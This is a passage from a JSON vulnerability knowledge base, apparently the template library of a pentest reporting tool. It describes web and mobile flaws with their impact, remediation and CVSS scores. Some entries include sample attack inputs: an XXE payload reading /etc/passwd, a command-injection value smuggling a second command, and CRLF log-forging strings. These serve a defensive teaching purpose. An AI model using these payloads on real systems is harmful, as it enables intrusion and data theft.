other websites, the URL parameters may also be sent to other websites as part of the HTTP Referrer header when a user clicks on one of the links.\nAdditionally, GET requests can make exploiting some vulnerabilities easier. For example, JavaScript Hijacking is an attack that can allow attackers to steal sensitive data returned in a JSON array in response to a GET request that contains predictable parameters.\n","poc":null,"impact":"Unnecessarily accepting GET requests may encourage developers to send sensitive parameters in GET requests in the future. GET requests can make it easier for attackers to exploit some vulnerabilities; for example, JavaScript Hijacking only works with HTTP GET requests.\n","remediation":"Do not accept HTTP GET requests unnecessarily as they can potentially lead to sensitive information leakage and may enable some attacks. If a GET request is received for a URL that should not receive GET requests, return an error message to the client.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:L/Au:N/C:N/I:N/A:N)","cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:00","updated_at":"2018-11-12 09:25:00","approved":1,"v_likelihood":"Low","v_impact":"Low","steps_to_reproduce":null,"likelihood_text":null},{"id":326,"plugin_id":null,"title":"Predictable Direct Object References","type":null,"description":"The application uses predictable identifiers (IDs) for its internal naming of application resources, such as the objects it manages, application functions and other aspects of its design.  The application generates these IDs using a predictable algorithm.  These IDs are meant to be internal, but are exposed through the parameter values passed between application pages and can be manipulated by an attacker. If an attacker were to modify these resource IDs, there is no other security control that prevents an attacker from gaining access to arbitrary resources.\n","poc":null,"impact":"Using predictable identifiers (IDs) that grant direct unauthorized access to application resources means that an attacker does not need to know resource IDs that have been created and also that an attacker can predict future IDs.\n","remediation":"Do not allow client side identifiers to be the sole control when deciding if access should be granted to a server side resource. There are several options to mitigate this vulnerability. One option is to ensure proper authorization checks exist whenever the application requests access to a resource. An alternative option is to store the resource identifiers that a client can access on the server as an array and pass an index to that array back to the client. In this case, although the client can modify the index, they cannot directly change what resource IDs they are allowed to access.  Additional options include implementing a tamper detection mechanism that ties identifiers to user sessions.\n","cvss_base_score":4,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:L/Au:S/C:P/I:N/A:N)","cvss_temporal_vector":null,"risk_factor":"Medium","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:00","updated_at":"2018-11-12 09:25:00","approved":1,"v_likelihood":"High","v_impact":"Medium","steps_to_reproduce":null,"likelihood_text":null},{"id":327,"plugin_id":null,"title":"Form Manipulation","type":null,"description":"Form manipulation occurs when the server sends fields it expects to be immutable and the client modifies them. A common example of such a situation is an HTML form which allows the user to edit some input fields but not others. When the form is submitted to the server, the names and values of the read-only values are sent along with the rest of the data, and the application updates all submitted values, not just those that the user should be able to modify. The application's assumption is that the input fields marked 'readonly' cannot be modified by the end user, however, it's possible to modify these fields using any HTTP proxy tool.\n","poc":null,"impact":"Form manipulation can result in a number of outcomes including object reference, user impersonation/privilege escalation, and circumvention of intended workflow. Unexpected values can even cause denial of service.\n","remediation":"In general, the application should assume that all data retrieved from the client (typically via HTTP GET or POST parameters) has been modified in some way. However, the following items can be used to identify the best approach to remediate:\n--If the data sent to the client isn't necessary and the server can maintain this state to meet business or functional requirements, simply do not send it.\n--If the data must be sent to the client, maintain the original values of the 'readonly' fields on the server-side in the user's session context. Do not trust the data returned by the client for those fields.\n--If the server must be stateless, and therefore unable to maintain session context, use an HMAC or other similar cryptographic solution to maintain the integrity of the 'readonly' fields on the client-side.\n\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:M/Au:S/C:N/I:N/A:N/CDP:LM/TD:ND)","cvss_temporal_vector":null,"risk_factor":"Medium","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:00","updated_at":"2018-11-12 09:25:00","approved":1,"v_likelihood":"Medium","v_impact":"Medium","steps_to_reproduce":null,"likelihood_text":null},{"id":328,"plugin_id":null,"title":"XPath Injection","type":null,"description":"An XPath Injection vulnerability occurs when an application constructs dynamic XPath queries by concatenating malicious data from an attacker and executes the resulting query.  The intent of constructing the query through string concatenation is to include the user-supplied data as values in the query.  The attacker can craft the user-supplied data so that the attacker's data is treated as part of the actual XPath query.\n","poc":null,"impact":"An XPath Injection vulnerability allows an attacker to modify XPath queries and get different content from the XML than the original XPath query intended.\n","remediation":"Use parameterized queries and/or perform strict input validation. For certain XPath processors, the XPath query can contain variables that are used in a fashion similar to parameter markers in parameterized SQL queries. With this approach, the XPath query is specified with variables, and user data is supplied separately when the query executes. The XPath engine guarantees that any user data passed to the arguments will be treated as data rather than as an XPath condition.\nAs part of a defense in depth strategy, input validation can provide another layer of defense when the allowed characters do not contain XPath control characters (e.g., a single quote or double quote).\n","cvss_base_score":4.3,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:M/Au:N/C:P/I:N/A:N)","cvss_temporal_vector":null,"risk_factor":"Medium","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:00","updated_at":"2018-11-12 09:25:00","approved":1,"v_likelihood":"Medium","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null},{"id":329,"plugin_id":null,"title":"HTTP PUT Method Site Defacement","type":null,"description":"The PUT HTTP method is enabled on the webserver, allowing arbitrary files to be uploaded and saved at the specified URI. The HTTP PUT method requests that the enclosed entity be stored under the supplied Request-URI (uniform resource identifier). If the URI can be defined as a new resource by the requesting user agent, the web server will create the resource on the web server. If an object's name already exists at the defined URI, the data in the request body will be considered a modified version of the object, overwriting what is currently on the server.\n","poc":null,"impact":"An attacker can abuse the HTTP PUT method by uploading malicious files to the web server or overwriting existing resources. An attacker may overwrite existing resources to deface the application or launch phishing attacks against victims. An attacker able to add new content to the server may have the ability to execute arbitrary code that provides access to other server side resources or create pages that execute malicious code to steal sensitive user information such as credentials or other PII.\n","remediation":"The web server must be configured to deny all HTTP PUT requests for all directories. If the HTTP PUT method is required as part of critical application functionality, the method must be restricted to trusted users only with strictly limited file permissions.\n","cvss_base_score":7.1,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:M/Au:N/C:N/I:C/A:N/CDP:MH/TD:ND)","cvss_temporal_vector":null,"risk_factor":"Medium","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:00","updated_at":"2018-11-12 09:25:00","approved":1,"v_likelihood":"Medium","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null},{"id":330,"plugin_id":null,"title":"Passwords Stored In Cleartext","type":null,"description":"Passwords are stored in clear-text in the database, leaving them vulnerable to exposure in the event of database compromise.\n","poc":null,"impact":"If an attacker gains access to the user database, user credentials will be directly exposed, allowing the attacker to impersonate legitimate users. The attacker could obtain sensitive information, modify or insert new data, or perform any other actions available to legitimate users. The impact of such unauthorized access to data and functionality cannot be overstated and may include data loss, large scale failure or inaccuracies in data. This will in turn affect the business goals of availability, integrity, and confidentiality.\nAn attacker may be able to gain access to the application database in several ways. If an attacker discovers a SQL injection flaw in the application that allows them even read-only access, every user's credentials may be exposed. If the application is free of vulnerabilities that expose database information to the attacker through the web application, a potential threat still exists when an insider with access to the database retrieves other users' credentials. For example, an un-authorized database administrator  could simply read credentials from the database and access the application as a valid application user. An outsider may also be able to obtain access to backup tapes or discarded hard discs containing database information which would in turn expose clear-text user credentials.\n","remediation":"For defense-in-depth, passwords should be salted and hashed to prevent an attacker from gaining access to clear-text passwords in the event that the database table containing user passwords is compromised. The first step toward securely storing passwords involves generating a random, fixed-length token (or \"salt\") when the clear-text password is about to be stored in the database:\n<pre><code class=\"dart\">SALT = rand( 64Bytes ) </pre>\nThe salt value and clear-text password should then be combined and hashed using a cryptographically secure hashing algorithm such as SHA-256. The concatenated password and salt can also be stored using an HMAC that utilizes SHA256.\n<pre><code class=\"dart\">OUT = HMAC_SHA256( KEY, CONCAT( PW, SALT )  ) + \":\" + SALT </pre>\nOnce the password is salted and hashed, the hash and plaintext salt can be stored in the database alongside the username. Alternatively, the password can be stored using a key derivation function for passwords. A key derivation function derives one or more secret keys from a secret value such as a master key or other known information such as a password or passphrase using a pseudo-random function. Three examples include pbkdf2, bcrypt, or scrypt. In this case, developers must specify a \"work factor\" for the function. This parameter's value will change depending on the chosen function but should be tuned to execute in 1/100th of a second (lower/higher depending on peak user load requirements) in the production environment.\nNote: once passwords are salted and hashed in the database, any functionality which involves user credentials will need to be modified to account for the change in how passwords are stored. When a user logs in, the application will need to take the supplied clear-text password, combine it with the salt stored in the database, hash the combination and compare the resulting hash with the hash stored for that user. If the hashes match, the supplied password matches the one the user submitted initially.\nFor more information, consult the OWASP Password Storage Cheat Sheet:\nhttps://www.owasp.org/index.php/Password_Storage_Cheat_Sheet\n","cvss_base_score":6.2,"cvss_temporal_score":0,"cvss_vector":"(AV:L/AC:M/Au:S/C:C/I:C/A:P)","cvss_temporal_vector":null,"risk_factor":"Medium","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:00","updated_at":"2018-11-12 09:25:00","approved":1,"v_likelihood":"Medium","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null},{"id":331,"plugin_id":null,"title":"WebDAV MKCOL HTTP Method Enabled","type":null,"description":"The WebDAV MKCOL method is enabled, allowing users to create arbitrary directories on the web server. WebDAV (Web-based Distributed Authoring and Versioning) is a set of extensions to HTTP/1.1. It is an open, published standard that allows you to edit documents on a remote web server. WebDAV supports a feature which allows grouping of resources into collections that are organized like a file system, similar to a directory or desktop folder.\nThis vulnerability occurs only if the server is running IIS and has WebDAV enabled along with the MKCOL method.\nMKCOL is an HTTP method, which can be used by WebDAV and is considered to be particularly dangerous since it can be used to create \"collections\" (or directories) on the web server. These directories can be created at the location specified by the Request-Uniform Resource Identifier (URI).\nThe following request creates the directory \"/webdisc/files/\" on the web server:\n<pre>MKCOL /webdisc/files/ HTTP/1.1 Host: www.example.com </pre>\nResponse:\n<pre>HTTP/1.1 201 Created </pre>\nIn addition to directory creation, if a body is specified in the MKCOL request, \"members\" (or resources) can be created in the directory.\n","poc":null,"impact":"Users can create directories and resources on the web server. An attacker may abuse this feature to upload malware that targets the server, network or other users, as well as phishing sites which attempt to extract information from victims.\n","remediation":"Disable WebDAV on the IIS server or disallow the HTTP method MKCOL.\n","cvss_base_score":7.1,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:M/Au:N/C:N/I:C/A:N/CDP:MH/TD:ND)","cvss_temporal_vector":null,"risk_factor":"Medium","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:00","updated_at":"2018-11-12 09:25:00","approved":1,"v_likelihood":"Medium","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null},{"id":332,"plugin_id":null,"title":"Database Error Pattern Found","type":null,"description":"Database error messages are returned to the browser and are visible to end users. Error messages may contain database table names, column names, version information, schema information, specific query structure, etc. Database errors can occur in various ways including, but not limited to:\n--User input concatenated into an SQL query without validation or escaping\n--Incorrect or invalid data types (typically during a conversion/cast)\n--Thread pool exhaustion\n--Time-of-check, time-of-use violations\n\n","poc":null,"impact":"Database errors disclose information about the database (and sometimes the particular query being executed) that may help an attacker develop more targeted or sophisticated attacks against the application. For example, an attacker who gains knowledge of table and column names may use this information to target database content via unrelated SQL injection attacks that they would have otherwise not known to target.\n","remediation":"The application should return generic error messages to the user's browser. If details about the error are needed for debugging or support reasons a unique identifier could be created and displayed to the user along with the generic error message for reference. This same unique identifier could be included with the error that is logged to the server so that it can be easily correlated with the issue.\n","cvss_base_score":3.5,"cvss_temporal_score":2.6,"cvss_vector":"(AV:N/AC:M/Au:S/C:P/I:N/A:N/E:U/RL:OF/RC:C/CDP:LM/TD:ND)","cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:00","updated_at":"2018-11-12 09:25:00","approved":1,"v_likelihood":"Medium","v_impact":"Low","steps_to_reproduce":null,"likelihood_text":null},{"id":333,"plugin_id":null,"title":"XML External Entity File Disclosure","type":null,"description":"XML External Entities attacks benefit from an XML feature to build documents dynamically at the time of processing. An XML entity allows including data dynamically from a given resource. External entities allow an XML document to include data from an external URI. Unless configured to do otherwise, external entities force the XML parser to access the resource specified by the URI, e.g., a file on the local machine or on a remote system. This behavior exposes the application to XML External Entity (XXE) attacks, which can be used to perform denial of service of the local and remote systems, gain unauthorized access to files on the local machine, and scan remote machines.  For example:\n<pre><code class=\"xml\"><?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>  <!DOCTYPE foo [      <!ELEMENT foo ANY >    <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo> </pre>\nSince the attack occurs relative to the application processing the XML document, an attacker may use this trusted application to pivot to other internal systems, possibly disclosing other internal content via http(s) requests. In some situations, an XML processor library that is vulnerable to client-side memory corruption issues may be exploited by dereferencing a malicious URI, possibly allowing arbitrary code execution under the application account. Other attacks can access local resources that may not stop returning data, possibly impacting application availability if too many threads or processes are not released.\n","poc":null,"impact":"Allowing an XML document to build documents from any external resource can result in the exposure of sensitive data, such as system files and user credentials , normally not accessible by the application.\n","remediation":"If possible, disable DTD resolution altogether. Very few applications have a business requirement to accept user defined DTDs. In all cases, set an XML entity expansion limit to prevent a denial of service attack.\n","cvss_base_score":4.3,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:M/Au:N/C:P/I:N/A:N)","cvss_temporal_vector":null,"risk_factor":"Medium","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:00","updated_at":"2018-11-12 09:25:00","approved":1,"v_likelihood":"Medium","v_impact":"Medium","steps_to_reproduce":null,"likelihood_text":null},{"id":334,"plugin_id":null,"title":"Lack of Certificate Pinning (Android)","type":null,"description":"--An attacker may compromise a legitimate Certificate Authority and use it to create malicious certificates. Several well-known Certificate Authorities trusted by all devices, such as Comodo and DigiNotar have been compromised in the past.\n--An attacker can trick a user into installing an attacker-controlled certificate.\n--Some public WiFi networks ask users to install a certificate before logging on to their network.\n--Carriers and device OEMs can pre-install their own certificates to the device before release.\n\n","poc":null,"impact":"Without certificate pinning, attackers who are able to obtain their own certificates for arbitrary websites from Certificate Authorities trusted by the device can perform Man-In-The-Middle attacks on otherwise secure HTTPS network connections. Such attackers will be able to eavesdrop or alter all communications of the mobile application, which may include sensitive information such as credentials and payment details.\n","remediation":"Mobile applications can use certificate pinning as an additional layer of security in order to verify that the certificate presented by the web service is the one the developers expect. Certificate pinning allows mobile applications to have fine-grained control over the certificates they trust. As mobile applications typically only exchange sensitive information with their own web services, the certificates chains of those services are well known during development and can be hardcoded into the application. \nHowever note that managing certificate pinning can be a complicated process with a potential to cause denial of service when the certificate on a server is updated or replaced. There are multiple approaches to designing the control correctly for each use case and details of such solutions are out of scope of this security assessment. \nCertificate pinning can be implemented on Android via third party libraries such as OkHttp and TrustKit for Android. The Android operating system also supports certificate pinning natively via the Network Security Policy capability, for devices with Android 7 and later.\n","cvss_base_score":8.3,"cvss_temporal_score":6.9,"cvss_vector":"(AV:A/AC:L/Au:N/C:C/I:C/A:C/E:F/RL:OF/RC:ND)","cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:00","updated_at":"2018-11-12 09:28:09","approved":1,"v_likelihood":"Minimal","v_impact":"Critical","steps_to_reproduce":null,"likelihood_text":null},{"id":335,"plugin_id":null,"title":"Command Injection","type":null,"description":"The application concatenates static command strings with user-supplied data and executes the resulting string as an operating system command. In this design, the user has some level of control over the structure of the OS command being executed. This allows the user to alter how the affected command executes, or insert entirely new commands which are executed by the server.\nConsider the following Java code which takes a value from an HTTP request query string parameter \"paramUserName\" and inserts it into a command executed on the web server:\n<pre><code class=\"java\">String username; username = request.getParameter(\"paramUserName\");  Runtime r = Runtime.getRuntime(); Process p = null; String cmd = \"/path/to/script.sh\";  p = r.exec(cmd + \" \" + username); </pre>\nWhen a user provides the username \"jsmith\", the following command is executed on the server:\n<pre><code class=\"bash\">/path/to/script.sh jsmith </pre>\nThis design can be exploited by taking advantage of the fact that UNIX and Windows both provide multiple ways to execute multiple OS commands in one call. To execute an additional command in the code above, an attacker can supply a username with an additional command appended to the supplied string. On a UNIX system, submitting the username \"jsmith; /path/to/other/command.sh\" results in the following command being executed on the server:\n<pre><code class=\"bash\">/path/to/script.sh jsmith; /path/to/other/command.sh </pre>\nThe second command in the chain executes once the first command has completed.\n","poc":null,"impact":"An attacker may exploit command injection to alter how the vulnerable command executes, or execute new commands completely under their control. This may have a wide range of effects on the server, including (but not limited to) the following:\n--Theft, destruction or modification of sensitive data stored on the affected system.\n--Denial of service attacks that aim to take down the server.\n--Launching an interactive shell on the system to more easily profile the system and its contents, execute more complex commands, or begin network reconnaissance to further infiltrate the internal network.\n\n","remediation":"Avoid inserting user-supplied data into commands executed by the operating system wherever possible; if this cannot be avoided, perform strict input validation via whitelist to deny or filter out control characters that the operating system would interpret as command separators.\nIn Unix, characters with special meaning on the command line include SPACE, TAB, NEWLINE, ;, (, ), <, >, |, and &.\nFor a complete list of Windows command line special characters, see the following page: http://www.robvanderwoude.com/escapechars.php\n","cvss_base_score":9.3,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:M/Au:N/C:C/I:C/A:C/CDP:H/TD:ND)","cvss_temporal_vector":null,"risk_factor":"High","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:00","updated_at":"2018-11-12 09:28:03","approved":1,"v_likelihood":"Medium","v_impact":"Critical","steps_to_reproduce":null,"likelihood_text":null},{"id":336,"plugin_id":null,"title":"HTTP Strict Transport Security (HSTS) Not Implemented","type":null,"description":"The server does not implement the \"HTTP Strict-Transport Security\" (HSTS) web security policy mechanism. When HSTS is enabled, the web application sends a special response header, \"Strict-Transport-Security\" to the client with a duration of time specified. Once a supported browser receives this header, that browser will only make requests to the application over HTTPS for the duration of time specified in the header. Any links to resources over HTTP will be rewritten to HTTPS before the request is made.","poc":"","impact":"Applications that do not utilize the \"HTTP Strict-Transport Security\" policy are more susceptible to man-in-the-middle attacks via SSL stripping, which occurs when an attacker transparently downgrades a victim's communication with the server from HTTPS to HTTP. Once this is accomplished, the attacker will gain the ability to view and potentially modify the victim's traffic, exposing sensitive information and gaining access to unauthorized functionality.","remediation":"The application server should send the \"Strict-Transport-Security\" HTTP header in each response indicating that future requests to the domain use only HTTPS. The following is a basic example of the HSTS HTTP header, setting a max-age of one year:\n<pre>Strict-Transport-Security: max-age=31536000 </pre>\nSubdomains should also be configured in this manner, by including the \"includeSubDomains\" flag:\n<pre>Strict-Transport-Security: max-age=31536000; includeSubDomains; </pre>","cvss_base_score":4.3,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:M/Au:N/C:P/I:N/A:N)","cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:01","updated_at":"2022-09-22 13:58:24","approved":1,"v_likelihood":"Low","v_impact":"Low","steps_to_reproduce":"- Use the following curl command with each URL above to verify the HSTS header\n<pre>curl -s -D- https://test.t3secure.net/ | grep -i Strict</pre>\n- Observe the grep results with no match, confirming that HSTS is missing.","likelihood_text":""},{"id":337,"plugin_id":null,"title":"Use of ECB (Electronic Code Book) in Cipher","type":null,"description":"The application uses a symmetric-key block cipher in Electronic Codebook (ECB) mode, which may result in the exposure of plaintext data to anyone with access to the ciphertext. Block ciphers are designed to encrypt fixed length blocks of data. For example, the Advanced Encryption Standard (AES) encrypts 128-bit blocks. Typically, encrypting a longer piece of data involves splitting the data into chunks that the block cipher can handle (which may optionally involve the addition of padding). Then, a mode of operation specifies exactly how the block cipher will be applied to each chunk. ECB mode involves splitting up the plaintext into blocks that the given cipher can process (as described above), and then encrypting each block independently.\nWhenever two identical blocks of plaintext are encrypted using the same key in ECB mode, the two resulting ciphertexts will be identical. As a result, if the same block of ciphertext appears in two locations (in the same message or in separate messages), an observer will be able to deduce that the same block of plaintext is present in those two locations. If an attacker happens to know the plaintext blocks corresponding to some ciphertext blocks, they will be able to deduce the plaintext whenever those particular ciphertext blocks appear.\n","poc":null,"impact":"An observer who sees data encrypted in ECB mode may be able to detect patterns in the underlying plaintext that leak information about the protected data. In addition, ECB mode does not protect data integrity. This not only allows attackers to modify ciphertexts in transit without the recipient being able to detect the modification, it may also allow attackers to perform attacks such as padding oracle attacks that may allow them to decrypt data.\n","remediation":"Consider using Galois/Counter Mode (GCM) instead of ECB mode. Under GCM mode, identical blocks of plaintext encrypted under the same key will generally not produce the same ciphertext. GCM mode also includes integrity protection so that the ciphertext cannot be tampered with without the recipient being able to detect it.\nNote: GCM mode requires an Initialization Vector (IV) as an input. It is important that a given IV never be reused when encrypting blocks of data using the same key. The confidentiality of the IV is not important, and it is acceptable to store/transmit it in the clear along with the ciphertext. See Section 8 in NIST SP 800-38D (http://csrc.nist.gov/publications/nistpubs/800-38D/SP-800-38D.pdf) for further details about secure usage of GCM mode.\nIf GCM mode cannot be used, then consider using Counter (CTR) mode instead. Note that CTR mode does not provide integrity protection; therefore, it should be used in conjunction with an HMAC. The easiest solution is to append an HMAC of the ciphertext to the ciphertext. The same considerations for initialization vectors as discussed above for GCM mode apply to CTR mode as well.\n","cvss_base_score":2.6,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:H/Au:N/C:P/I:N/A:N)","cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:01","updated_at":"2018-11-12 09:25:01","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":338,"plugin_id":null,"title":"Excessive Session Timeout Duration","type":null,"description":"The application does not log the user out after a reasonable period of inactivity. Inactivity timeout periods vary depending on the sensitivity of the data and functionality the application contains, but idle sessions longer than 15-30 minutes are typically considered vulnerable.\n","poc":null,"impact":"An attacker's ability to hijack a victim's session increases proportionally with the amount of time an idle user's session remains valid. Once a valid session identifier is obtained, the attacker can impersonate the victim in the application, performing any functionality and accessing any data made available to the victim. Longer session timeouts also prevent server memory from being released, resulting in potential denial of service conditions when an attacker initiates a large number of sessions in a sufficiently short period.\n","remediation":"Terminate the user's session server-side after a sufficiently short idle period. When the user makes further requests using the expired session, they should be redirected to a splash page or the login page. In addition, client-side code should track session idle time and automatically redirect the user to a splash page or the login page after a certain period of client-side inactivity has passed. No prior authenticated user data or functionality should continue to be displayed after the timeout occurs.\nDetermine a session timeout duration that sufficiently protects end users and the application while maintaining system usability. Session timeouts of 15-30 minutes are common for most web applications and vary depending on the sensitivity of the information available during each session. Various standards organizations and government entities also typically recommend organization-defined timeouts or call for an idle timeout of 15-30 minutes:\n--PCI DSS v3.2 section 8.1.8 states, \"If a session has been idle for more than 15 minutes, require the user to re-authenticate to re-activate the terminal or session.\"\n--U.S. CNSS - CNSSI No. 1253 section AC-11 states, \"Session Lock ... not to exceed 30 minutes\"\n--NIST SP800-53 section AC-11 states, \"...Prevents further access to the system by initiating a session lock after [Assignment: organization-defined time period] of inactivity or upon receiving a request from a user\"\n\n","cvss_base_score":4,"cvss_temporal_score":3.3,"cvss_vector":"(AV:N/AC:H/Au:N/C:P/I:N/A:P/E:F/RL:OF/RC:C)","cvss_temporal_vector":null,"risk_factor":"Medium","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:01","updated_at":"2018-11-12 09:25:01","approved":1,"v_likelihood":"Medium","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null},{"id":339,"plugin_id":null,"title":"TRACE and TRACK HTTP Methods Enabled","type":null,"description":"The HTTP TRACE and TRACK methods are enabled on the web server. The HTTP TRACE and TRACK methods instruct the web server to echo the entire contents of the received message back to the calling client, usually for debugging purposes. Consider the following example TRACE request to a webserver running on localhost:\n<pre>TRACE / HTTP/1.1 Host: 127.0.0.1 </pre>\nIf TRACE or TRACK is enabled, the server will respond with a message body consisting of the initial request's HTTP headers and message body:\n<pre>HTTP/1.1 200 OK Date: Sat, 11 May 2013 14:46:59 GMT Server: Apache/2.2.3 (Red Hat) Connection: close Transfer-Encoding: chunked Content-Type: message/http  TRACE / HTTP/1.1 Host: 127.0.0.1 </pre>\nNote: the TRACK method was developed by Microsoft and it performs essentially the same function as the TRACE method. Unlike TRACE however, the TRACK method never gained wide acceptance.\n","poc":null,"impact":"The HTTP TRACE and TRACK methods can be used in conjunction with other vulnerabilities (such as cross-site scripting) to return the entire contents of an HTTP request message (including HTTP headers) to an attacker. Since the server echoes both the request body and HTTP headers, an attacker able to obtain the response to the TRACE or TRACK request would gain access to sensitive information passed via HTTP headers, including session identifiers passed via cookies. The attacker could then use this information to impersonate the victim in the application.\n","remediation":"Disable the HTTP TRACE and TRACK methods if not required for the web server to function properly.\n","cvss_base_score":4.3,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:M/Au:N/C:P/I:N/A:N)","cvss_temporal_vector":null,"risk_factor":"Medium","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:01","updated_at":"2018-11-12 09:25:01","approved":1,"v_likelihood":"Medium","v_impact":"Medium","steps_to_reproduce":null,"likelihood_text":null},{"id":340,"plugin_id":null,"title":"Concurrent Sessions","type":null,"description":"The application allows concurrent sessions; multiple users are able to login to the application simultaneously with the same user credentials.\n","poc":null,"impact":"An application that allows concurrent sessions provides an attacker with the ability to establish an active session while the victim remains logged in. This simultaneous access to the application prevents users from determining if their account has been compromised and removes the victim's ability to invalidate the attacker's session. Without the means to terminate an attacker's session, the attacker will be able to impersonate the victim in the application for the life of the session.\nThe use of concurrent sessions can also lead to a lack of user accountability in the system if credentials are shared among the user base. Once a set of credentials is shared by multiple users it becomes difficult (if not impossible) to tie actions to a particular user.\n","remediation":"The application should only allow a user to establish a single session with a particular set of credentials at a time. Once that session has been established, subsequent attempts to login using those credentials should either be denied or existing sessions should be terminated, depending on business needs.\nIf concurrent sessions are required for business purposes, additional session management features must be provided to ensure that all end users are made aware of multiple sessions. Such features include allowing end users to view all current sessions, prompting users when a new session is created, and providing users the ability to terminate unwanted sessions. Additionally, when allowing concurrent sessions it is recommended that users are notified that their credentials were used to establish a new session, including the time and IP from which the session was established.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:L/Au:S/C:N/I:N/A:N)","cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:01","updated_at":"2018-11-12 09:25:01","approved":1,"v_likelihood":"Minimal","v_impact":"Low","steps_to_reproduce":null,"likelihood_text":null},{"id":341,"plugin_id":null,"title":"Log Forging","type":null,"description":"Log forging occurs when data enters an application from an untrusted source and is written to application or system log files with no prior sanitization or encoding.\nFor example, an attacker may split a legitimate log entry into two log entries by inserting a carriage return and line feed sequence (CRLF) making either of them misleading. This may be accomplished as follows -\nConsider the following code snippet that logs the value of variable \"someVar\"\n<pre><code class=\"java\">String someVar = getRequestParameter (\"test\"); log (\"Data is: \" + someVar); </pre>\nFor a normal request, the associated log entry may look like:\n<pre>?test=Log Entry 1 </pre>\n<pre><code class=\"dart\">[2012-03-15 02:04:31] [TestUser1] Data is: Log Entry 1 </pre>\nAn attacker however may insert a carriage return and line feed sequence to generate misleading log data as shown below -\n<pre>?test = Log Entry 1\\r\\n[2012-03-15 02:04:39] [TestUser2] TestUser2 created new user\\r\\n[2012-03-15 02:04:46] [TestUser3] TestUser3 just logged out\\r\\n[2012-03-15 02:04:55] [TestUser4] TestUser4 performed an important function </pre>\n<pre><code class=\"dart\">[2014-05-22 10:01:10] [TestUser1] Data is: Log Entry 1 [2014-05-22 10:10:45] [TestUser2] TestUser2 created new user [2014-05-22 10:11:24] [TestUser3] TestUser3 just logged out [2014-05-22 10:20:33] [TestUser4] TestUser4 performed an important function </pre>\n","poc":null,"impact":"Log Forging allows an attacker to insert invalid or bogus entries into application logs, thereby compromising the integrity of the logged data. As a result, log files will no longer be available as reliable sources of information and be usable for troubleshooting or forensic analysis. Attackers may leverage log forging to insert fake entries that obfuscate their presence in an application, implicate valid users as part of a malicious act, or inject unexpected values.\n","remediation":"A log forging vulnerability may be remediated by sanitizing all input being saved to application logs, as well as performing output encoding on all data displayed to end users. While traditional input validation looks to deny or allow content based on a defined signature, the validation routines to prevent log forging must maintain the original input data. To do this all alpha-numeric and non-printable characters should be hex encoded before being stored in the log. This will allow for a log file to show a potential attack has been executed against the application, but will not allow the malicious characters to be rendered.\nAdditionally all data should be encoded when being sent to a log viewing application in accordance to the context of the viewer. Output encoding requires that characters in data that may be interpreted as control characters in a given output context are encoded before they are inserted in that output context (a log viewer in this case). Output encoding libraries exist for most popular programming languages and frameworks.\nLibraries for implementing the encoding schemes exist for most popular programming languages.\n--OWASP ESAPI:  Supports Java, PHP, Classic ASP, Cold Fusion, Python, and Haskell\n--OWASP Java Encoder:  Java only\n--Microsoft Web Protection Library: .NET languages\n--Ruby - escapeHTML() - only supports HTML Text Encoding\n--Jgencoder in JQuery\n\n--Google Capabilities based JavaScript CAJA\n--OWASP JXT- automatically encodes string data with the proper 